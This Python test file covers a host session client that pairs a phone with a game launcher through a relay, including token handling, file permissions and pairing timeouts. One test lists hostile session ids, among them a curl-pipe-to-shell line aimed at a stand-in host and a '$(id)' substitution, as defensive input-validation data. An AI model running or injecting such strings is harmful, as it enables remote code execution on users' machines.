import asyncio
import json
import stat
import subprocess
import urllib.error
import urllib.request

import pytest

from host import session as host_session
from host.session import (
    PairingWaiter,
    SessionCredentials,
    create_session,
    credentials_from_env,
    delete_session,
    main,
    qr_payload,
    subscriber_count,
    write_session_env,
)
from relay.app import build_app
from relay.state import RelayState
from tests.helpers import Clock, serving


class RecordingCall:
    """Stands in for the urllib round trip so no test touches the network."""

    def __init__(self, *responses, exception=None):
        self.calls = []
        self.responses = list(responses)
        self.exception = exception

    def __call__(self, url, method, token):
        self.calls.append((url, method, token))
        if self.exception is not None:
            raise self.exception
        return self.responses.pop(0) if self.responses else None


CREDENTIALS = SessionCredentials(
    base_url="https://relay.example",
    session_id="sess-1",
    publisher_token="pub-token",
    subscriber_token="sub-token",
)

CREATED = {
    "session_id": "sess-1",
    "publisher_token": "pub-token",
    "subscriber_token": "sub-token",
    "expires_at": 15400.0,
}


# --- create -------------------------------------------------------------

def test_create_session_posts_to_the_sessions_endpoint_with_no_credential():
    call = RecordingCall(CREATED)
    credentials = create_session("https://relay.example", call=call)
    assert call.calls == [("https://relay.example/sessions", "POST", None)]
    assert credentials == CREDENTIALS


def test_a_trailing_slash_does_not_double_up():
    call = RecordingCall(CREATED)
    credentials = create_session("https://relay.example/", call=call)
    assert call.calls[0][0] == "https://relay.example/sessions"
    assert credentials.base_url == "https://relay.example"


@pytest.mark.parametrize("base", ["http://relay.example", "relay.example", "ftp://x"])
def test_a_non_https_base_url_is_refused(base):
    # TLS terminates in front of the relay, so the client is the only place
    # this can be enforced.
    with pytest.raises(ValueError):
        create_session(base, call=RecordingCall(CREATED))


def test_create_session_raises_when_the_relay_is_unreachable():
    # The launcher is the layer that degrades to LAN-only; it has to be told.
    call = RecordingCall(exception=urllib.error.URLError("no route to host"))
    with pytest.raises(urllib.error.URLError):
        create_session("https://relay.example", call=call)


@pytest.mark.parametrize("hostile", [
    "x; curl evil.example | sh",   # the launcher sources this file
    "$(id)",
    "../../other-session",         # would rewrite the publish URL
    "abc?role=host",
    "abc#frag",
    "abc/def",
    "",
    "tökén",
])
def test_an_implausible_session_id_from_the_relay_is_refused(hostile):
    # The host interpolates these into a URL and writes them into a file the
    # launcher sources. shlex.quote covers the shell; this covers the URL, and
    # neither should ever be the only thing standing between a hostile relay
    # and the host PC. Real ids are secrets.token_urlsafe output.
    call = RecordingCall({**CREATED, "session_id": hostile})
    with pytest.raises(ValueError):
        create_session("https://relay.example", call=call)


@pytest.mark.parametrize("field", ["publisher_token", "subscriber_token"])
def test_an_implausible_token_from_the_relay_is_refused(field):
    call = RecordingCall({**CREATED, field: "tok en/../x"})
    with pytest.raises(ValueError):
        create_session("https://relay.example", call=call)


# --- the QR payload -----------------------------------------------------

def test_the_qr_payload_puts_the_token_in_the_fragment():
    # Browsers never transmit a fragment, so the credential cannot reach the
    # relay's access log, a proxy log or a Referer header.
    payload = qr_payload(CREDENTIALS)
    assert payload == "https://relay.example/j#sess-1.sub-token"
    before_fragment, _, fragment = payload.partition("#")
    assert "sub-token" not in before_fragment
    assert fragment == "sess-1.sub-token"


def test_the_qr_payload_never_carries_the_publisher_token():
    assert "pub-token" not in qr_payload(CREDENTIALS)


# --- polling ------------------------------------------------------------

def test_subscriber_count_reads_the_session_with_the_publisher_token():
    call = RecordingCall({"subscribers": 2, "expires_at": 15400.0})
    assert subscriber_count(CREDENTIALS, call=call) == 2
    assert call.calls == [
        ("https://relay.example/sessions/sess-1", "GET", "pub-token")
    ]


# --- deletion -----------------------------------------------------------

def test_delete_session_deletes_with_the_publisher_token():
    call = RecordingCall()
    assert delete_session(CREDENTIALS, call=call) is True
    assert call.calls == [
        ("https://relay.example/sessions/sess-1", "DELETE", "pub-token")
    ]


def test_delete_session_never_raises():
    # It runs on the launcher's exit path, where raising helps nobody.
    call = RecordingCall(exception=urllib.error.URLError("relay down"))
    assert delete_session(CREDENTIALS, call=call) is False


# --- the environment file -----------------------------------------------

def test_the_session_env_file_is_only_readable_by_its_owner(tmp_path):
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def test_the_session_env_file_is_tightened_even_if_it_already_exists(tmp_path):
    # O_CREAT's mode argument applies only on creation, so a file left behind
    # at a wider mode would otherwise keep it and leak the token.
    path = tmp_path / "session.env"
    path.write_text("stale\n")
    path.chmod(0o644)
    write_session_env(path, CREDENTIALS)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def test_the_session_env_file_is_sourceable_by_sh(tmp_path):
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    done = subprocess.run(
        ["sh", "-c", f'. "{path}"; printf "%s\\n%s\\n" '
                     '"$JBVIP_SESSION_ID" "$JBVIP_SESSION_TOKEN"'],
        capture_output=True, text=True, check=True,
    )
    assert done.stdout.splitlines() == ["sess-1", "pub-token"]


def test_the_session_env_file_carries_the_publisher_token_only(tmp_path):
    # The extractor publishes; it has no business subscribing, and the
    # subscriber token belongs to the phone alone.
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    written = path.read_text()
    assert "pub-token" in written
    assert "sub-token" not in written


def test_credentials_can_be_read_back_out_of_the_environment():
    environ = {
        "JBVIP_RELAY_URL": "https://relay.example/",
        "JBVIP_SESSION_ID": "sess-1",
        "JBVIP_SESSION_TOKEN": "pub-token",
    }
    credentials = credentials_from_env(environ)
    assert credentials.session_id == "sess-1"
    assert credentials.publisher_token == "pub-token"
    assert credentials.base_url == "https://relay.example"


@pytest.mark.parametrize("missing", [
    "JBVIP_RELAY_URL", "JBVIP_SESSION_ID", "JBVIP_SESSION_TOKEN"
])
def test_credentials_from_a_half_set_environment_are_none(missing):
    environ = {
        "JBVIP_RELAY_URL": "https://relay.example",
        "JBVIP_SESSION_ID": "sess-1",
        "JBVIP_SESSION_TOKEN": "pub-token",
    }
    del environ[missing]
    assert credentials_from_env(environ) is None


# --- main() ---------------------------------------------------------------
# main() runs inside the launcher's EXIT trap, so a non-zero return would
# change the exit code the game reports to Steam. Every documented
# invocation must return 0, never raise.


def test_main_with_no_flags_returns_zero_rather_than_raising():
    # argparse's own parser.error() raises SystemExit, which main() must not
    # let escape for its own "nothing to do" case.
    assert main([]) == 0


def test_main_delete_with_no_credentials_in_environment_attempts_no_request(
    monkeypatch,
):
    for var in ("JBVIP_RELAY_URL", "JBVIP_SESSION_ID", "JBVIP_SESSION_TOKEN"):
        monkeypatch.delenv(var, raising=False)

    def unexpected_urlopen(*args, **kwargs):
        raise AssertionError("no credentials means no request should be attempted")

    monkeypatch.setattr(host_session.urllib.request, "urlopen", unexpected_urlopen)
    assert main(["--delete"]) == 0


def test_main_delete_returns_zero_even_when_the_delete_fails(monkeypatch):
    monkeypatch.setenv("JBVIP_RELAY_URL", "https://relay.example")
    monkeypatch.setenv("JBVIP_SESSION_ID", "sess-1")
    monkeypatch.setenv("JBVIP_SESSION_TOKEN", "pub-token")
    attempted = []

    def failing_urlopen(*args, **kwargs):
        attempted.append(1)
        raise urllib.error.URLError("relay down")

    monkeypatch.setattr(host_session.urllib.request, "urlopen", failing_urlopen)
    assert main(["--delete"]) == 0
    assert attempted == [1]


# --- PairingWaiter ------------------------------------------------------

def test_the_waiter_keeps_waiting_while_no_phone_has_arrived():
    waiter = PairingWaiter(lambda: 0, now=Clock(0.0), timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.subscribers == 0


def test_the_waiter_reports_paired_once_a_phone_subscribes():
    waiter = PairingWaiter(lambda: 1, now=Clock(0.0), timeout=120.0)
    assert waiter.poll() == PairingWaiter.PAIRED
    assert waiter.subscribers == 1


def test_the_waiter_stops_polling_once_paired():
    calls = []

    def count():
        calls.append(1)
        return 1

    waiter = PairingWaiter(count, now=Clock(0.0), timeout=120.0)
    waiter.poll()
    waiter.poll()
    assert len(calls) == 1


def test_the_waiter_times_out_when_the_deadline_passes():
    clock = Clock(0.0)
    waiter = PairingWaiter(lambda: 0, now=clock, timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    clock.t = 120.0
    assert waiter.poll() == PairingWaiter.TIMED_OUT


def test_a_failed_poll_does_not_end_the_wait():
    # A one-second blip while the user is fumbling with the camera must not
    # close the window. Only the deadline does that.
    clock = Clock(0.0)
    attempts = []

    def flaky():
        attempts.append(1)
        if len(attempts) < 3:
            raise urllib.error.URLError("connection reset")
        return 1

    waiter = PairingWaiter(flaky, now=clock, timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.error is not None
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.poll() == PairingWaiter.PAIRED
    assert waiter.error is None


def test_the_waiter_reports_the_time_it_has_left():
    clock = Clock(0.0)
    waiter = PairingWaiter(lambda: 0, now=clock, timeout=120.0)
    assert waiter.remaining() == 120.0
    clock.t = 30.0
    assert waiter.remaining() == 90.0
    clock.t = 500.0
    assert waiter.remaining() == 0.0


# --- the urllib transport itself ----------------------------------------

def test_the_transport_builds_an_authenticated_request(monkeypatch):
    captured = {}

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self):
            return json.dumps({"subscribers": 3}).encode()

    def fake_urlopen(request, timeout=None):
        captured["request"] = request
        captured["timeout"] = timeout
        return FakeResponse()

    monkeypatch.setattr(host_session.urllib.request, "urlopen", fake_urlopen)
    body = host_session._urllib_call(
        "https://relay.example/sessions/sess-1", "GET", "pub-token"
    )
    request = captured["request"]
    assert request.get_method() == "GET"
    assert request.get_header("Authorization") == "Bearer pub-token"
    assert body == {"subscribers": 3}
    assert captured["timeout"] == host_session.REQUEST_TIMEOUT_SECONDS


def test_the_transport_sends_no_authorization_header_when_there_is_no_token(
    monkeypatch,
):
    captured = {}

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self):
            return b""

    def fake_urlopen(request, timeout=None):
        captured["request"] = request
        return FakeResponse()

    monkeypatch.setattr(host_session.urllib.request, "urlopen", fake_urlopen)
    assert host_session._urllib_call("https://relay.example/sessions", "POST",
                                     None) is None
    assert captured["request"].get_header("Authorization") is None


# --- the client/server seam ---------------------------------------------
# Everywhere above, the transport is faked. These run the real client against
# the real app so a route change, a header change or a key rename cannot pass
# the suite. The scheme downgrade is the only thing altered.


def downgrading_call(url, method, token):
    return host_session._urllib_call(
        url.replace("https://", "http://"), method, token
    )


async def test_the_real_client_creates_and_deletes_a_real_session():
    # asyncio.to_thread keeps the blocking urllib call off the loop, so the
    # live server can actually serve it.
    state = RelayState(now=Clock())
    async with serving(build_app(state)) as http:
        base = f"https://127.0.0.1:{http.base_url.port}"
        credentials = await asyncio.to_thread(
            create_session, base, call=downgrading_call
        )
        assert state.session(credentials.session_id) is not None
        assert await asyncio.to_thread(
            delete_session, credentials, call=downgrading_call
        ) is True
        assert state.session(credentials.session_id) is None


async def test_the_real_client_counts_a_real_subscriber():
    state = RelayState(now=Clock())
    async with serving(build_app(state)) as http:
        base = f"https://127.0.0.1:{http.base_url.port}"
        credentials = await asyncio.to_thread(
            create_session, base, call=downgrading_call
        )
        assert await asyncio.to_thread(
            subscriber_count, credentials, call=downgrading_call
        ) == 0
        async with http.stream(
            "GET",
            f"/sessions/{credentials.session_id}/subscribe",
            headers={"Authorization": f"Bearer {credentials.subscriber_token}"},
        ) as response:
            assert response.status_code == 200
            assert await asyncio.to_thread(
                subscriber_count, credentials, call=downgrading_call
            ) == 1
